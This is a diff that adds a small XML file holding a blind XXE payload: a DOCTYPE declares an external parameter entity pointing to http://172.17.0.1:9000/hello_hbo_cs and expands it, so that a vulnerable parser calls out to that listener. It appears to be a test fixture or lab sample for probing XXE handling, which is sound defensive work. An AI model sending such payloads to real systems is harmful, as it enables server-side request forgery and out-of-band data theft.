@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY % blind SYSTEM "http://172.17.0.1:9000/hello_hbo_cs">
+   %blind;
+]>
+<foo></foo>
+
